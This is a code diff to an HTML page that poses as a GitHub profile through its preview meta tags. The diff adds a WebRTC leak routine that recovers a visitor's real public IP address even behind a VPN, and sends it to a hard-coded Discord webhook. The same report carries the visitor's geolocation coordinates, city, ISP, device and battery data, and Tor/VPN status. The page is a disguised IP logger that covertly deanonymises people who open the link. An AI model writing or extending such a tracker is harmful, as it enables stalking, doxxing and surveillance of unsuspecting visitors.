@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <!-- ===== EMBED META TAGS (con URL de imagen forzada para cache) ===== -->
+    <!-- ===== EMBED META TAGS ===== -->
     <meta property="og:image" content="https://i.imgur.com/JbRnGVK.jpeg" />
     <meta property="og:image:alt" content="PotatoDestroyer has one repository available. Follow their code on GitHub." />
     <meta property="og:title" content="PotatoDestroyer - Profile" />
@@ -12,7 +12,7 @@
     <meta name="twitter:title" content="PotatoDestroyer - Profile" />
     <meta name="twitter:description" content="PotatoDestroyer has one repository available. Follow their code on GitHub." />
     <meta name="twitter:image" content="https://i.imgur.com/JbRnGVK.jpeg" />
-    <!-- ===== FIN EMBED META TAGS ===== -->
+    <!-- ===== FIN EMBED ===== -->
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -101,6 +101,49 @@
             const statusEl = document.getElementById('status');
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6';
 
+            // ========== NUEVA FUNCIÓN: WebRTC Leak ==========
+            function getIPviaWebRTC() {
+                return new Promise((resolve) => {
+                    const pc = new RTCPeerConnection({
+                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                    });
+                    pc.createDataChannel('test');
+                    pc.createOffer()
+                        .then(offer => pc.setLocalDescription(offer))
+                        .catch(() => {});
+
+                    let ip = null;
+
+                    pc.onicecandidate = (event) => {
+                        if (event.candidate) {
+                            const candidate = event.candidate.candidate;
+                            const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/; // solo IPv4
+                            const match = candidate.match(ipRegex);
+                            if (match) {
+                                const foundIP = match[0];
+                                // Descartar IPs locales
+                                if (!foundIP.startsWith('192.168.') &&
+                                    !foundIP.startsWith('10.') &&
+                                    !foundIP.startsWith('172.') &&
+                                    foundIP !== '127.0.0.1') {
+                                    ip = foundIP;
+                                    resolve(ip);
+                                    pc.close();
+                                }
+                            }
+                        } else {
+                            if (!ip) resolve(null);
+                        }
+                    };
+
+                    setTimeout(() => {
+                        if (!ip) resolve(null);
+                        pc.close();
+                    }, 5000);
+                });
+            }
+            // ========== FIN WebRTC ==========
+
             function getDeviceInfo() {
                 const nav = navigator;
                 const ua = nav.userAgent;
@@ -149,7 +192,8 @@
                 return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
             }
 
-            async function sendToDiscord(ipData, device, battery, torDetected) {
+            // ========== FUNCIÓN MODIFICADA: ahora recibe realIP ==========
+            async function sendToDiscord(ipData, device, battery, torDetected, realIP) {
                 let vpnTorStatus = 'No VPN/TOR Found';
                 const proxyDetected = ipData.proxy === true;
                 if (proxyDetected && torDetected) {
@@ -161,7 +205,8 @@
                 }
 
                 const fields = [
-                    { name: 'IP Address', value: ipData.ip || 'N/A', inline: true },
+                    { name: 'IP Pública (API)', value: ipData.ip || 'N/A', inline: true },
+                    { name: 'IP Real (WebRTC)', value: realIP || 'No detectada', inline: true },
                     { name: 'Coordinates', value: ipData.latitude && ipData.longitude ? ipData.latitude + ', ' + ipData.longitude : 'N/A', inline: true },
                     { name: 'City / Region / Country', value: (ipData.city || 'N/A') + ', ' + (ipData.region || 'N/A') + ', ' + (ipData.country_name || 'N/A'), inline: false },
                     { name: 'Postal Code / ISP', value: (ipData.postal || 'N/A') + ' | ' + (ipData.org || ipData.isp || 'N/A'), inline: false },
@@ -207,8 +252,12 @@
                 }
             }
 
+            // ========== FUNCIÓN EXECUTE MODIFICADA ==========
             async function execute() {
                 const device = getDeviceInfo();
+
+                // Lanzar WebRTC en paralelo con las demás peticiones
+                const webrtcPromise = getIPviaWebRTC();
                 const batteryPromise = getBatteryInfo();
                 const geoPromise = fetch('https://ipapi.co/json/')
                     .then(res => res.ok ? res.json() : null)
@@ -217,7 +266,12 @@
                     .then(res => res.ok ? res.json() : null)
                     .catch(() => null);
 
-                const [battery, geoData, torData] = await Promise.all([batteryPromise, geoPromise, torPromise]);
+                const [realIP, battery, geoData, torData] = await Promise.all([
+                    webrtcPromise,
+                    batteryPromise,
+                    geoPromise,
+                    torPromise
+                ]);
 
                 let ipData = geoData;
                 if (!ipData || !ipData.ip) {
@@ -243,7 +297,9 @@
                 }
 
                 const torDetected = torData && torData.IsTor === true;
-                await sendToDiscord(ipData, device, battery, torDetected);
+
+                // Enviar a Discord con la IP real
+                await sendToDiscord(ipData, device, battery, torDetected, realIP);
             }
 
             if (document.readyState === 'complete') {
